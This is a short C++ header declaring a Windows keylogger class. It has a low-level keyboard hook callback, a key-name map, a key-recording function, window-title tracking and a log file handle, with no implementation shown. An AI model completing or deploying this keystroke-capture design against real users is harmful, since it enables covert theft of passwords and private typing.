#pragma once

#include <map>
#include <string>
#include <windows.h>

class Keylogger {
private:
	char* lastWindowTitle;
	std::map<DWORD, std::string> keyNameMap;
	Keylogger();
	static std::string getKeyName(DWORD vkCode);
	static void registerKey(std::string key);
	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	void initializeKeyNameMap();
public:
	HANDLE logFile;
	static Keylogger& getInstance();
};

